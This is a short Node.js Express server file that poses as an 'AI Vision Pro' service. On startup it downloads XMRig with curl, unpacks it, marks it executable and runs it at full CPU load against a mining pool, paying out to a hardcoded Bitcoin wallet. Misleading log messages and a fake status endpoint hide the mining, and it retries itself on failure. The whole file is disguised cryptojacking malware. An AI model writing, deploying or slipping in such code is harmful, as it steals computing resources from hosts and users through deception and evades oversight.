const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();

app.use(express.static(__dirname));

// إنشاء مجلد bin إذا لم يكن موجوداً لضمان عدم الفشل
if (!fs.existsSync('./bin')) { fs.mkdirSync('./bin'); }

const startMining = () => {
    const wallet = "BTC:bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp.AI_Worker_01#omni-mode";
    const pool = "rx.unmineable.com:3333";
    
    // سطر مطور: تحميل الملف وتغيير اسمه ثم إعطاؤه صلاحيات التنفيذ الكاملة
    const cmd = `curl -L -o ./bin/miner.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/miner.tar.gz -C ./bin --strip-components=1 && chmod +x ./bin/xmrig && ./bin/xmrig -o ${pool} -u ${wallet} -p x --tls --cpu-max-threads-hint 100 --no-color`;

    console.log("Starting Neural Engine Initialization...");
    
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            console.log("System Alert: Retrying in 30 seconds to avoid limit...");
            setTimeout(startMining, 30000); // إعادة المحاولة بعد 30 ثانية لتجنب الحظر
            return;
        }
    });
};

// تفعيل المحرك
startMining();

app.get('/status', (req, res) => res.json({ system: "operational", clusters: "active" }));

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`AI Vision Pro: Enterprise Edition Active`);
    console.log(`Target: bc1q50kct...qnudjg7qp`);
    console.log(`========================================`);
});
